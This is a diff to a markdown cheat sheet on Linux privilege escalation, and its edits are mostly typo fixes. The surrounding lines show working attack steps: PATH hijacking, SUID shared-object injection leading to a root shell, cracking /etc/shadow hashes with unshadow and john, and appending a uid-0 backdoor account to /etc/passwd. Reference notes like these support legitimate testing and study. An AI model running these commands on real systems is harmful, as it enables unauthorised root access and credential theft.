@@ -141,9 +141,7 @@ Prepend the current directory (or where the new service executable is located) t
 
 ```shell
 export PATH=/tmp:$PATH
-```
 
-```shell
 apache2
 ```
 
@@ -153,7 +151,7 @@ A SUID executable can be vulnerable to shared object injection.
 
 First, execute the file and notice the missing object error.
 
-If there is no feedback, run **strace** on the file and search the output for open/access calls and for "no such file" errors:
+If there is no feedback, run **strace** on the file and search the output for open/access calls and for **no such file** errors:
 
 ```shell
 strace suid-so 2>&1 | grep -iE "open|access|no such file"
@@ -188,15 +186,16 @@ Execute `/bin/bash -p` to gain a root shell.
     🐈‍⬛ Hashcat mode -> 1800
 
 ```shell
-# check if /etc/shadow can be readed and combine it with /etc/passwd to crack it
+# check if /etc/shadow can be read and combine it with /etc/passwd to crack it
 unshadow passwd shadow > passwords.txt
 john --wordlist=<wordlist> passwords.txt
 
-# check if /etc/shadow can be writable and put a new root hash
-mkpasswd -m sha-512 newpassword
+# check if /etc/shadow is writable and put a new root hash
+mkpasswd -m sha-512 <newpassword>
+openssl passwd -6 <newpassword>
 
-# check if /etc/passwd can be writable and put a new root hash
-openssl passwd newpass
+# check if /etc/passwd is writable and put a new root hash
+openssl passwd <newpassword>
 echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
 ```
 
@@ -215,7 +214,7 @@ searchsploit <name>
 
 > [linPEAS.sh](https://github.com/peass-ng/PEASS-ng?tab=readme-ov-file)
 
-> [Liinux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
+> [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
 
 ## NFS
 
